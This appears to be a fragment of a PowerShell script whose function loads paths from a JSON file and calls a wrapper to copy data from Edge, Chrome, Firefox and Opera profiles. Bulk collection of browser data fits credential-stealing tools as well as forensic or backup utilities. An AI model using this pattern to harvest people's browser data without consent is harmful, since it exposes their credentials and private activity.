function Browser-Data-Retrieval
{
    $browser = Get-Content '.\Browser-Data-Paths.json' | Out-String | ConvertFrom-Json

    Browser-Data-Wrapper $browser.SavePath.Edge $browser.FilePath.Edge
    Browser-Data-Wrapper $browser.SavePath.Chrome $browser.FilePath.Chrome
    Browser-Data-Wrapper $browser.SavePath.Firefox $browser.FilePath.Firefox
    Browser-Data-Wrapper $browser.SavePath.Opera $browser.FilePath.Opera
    
}
}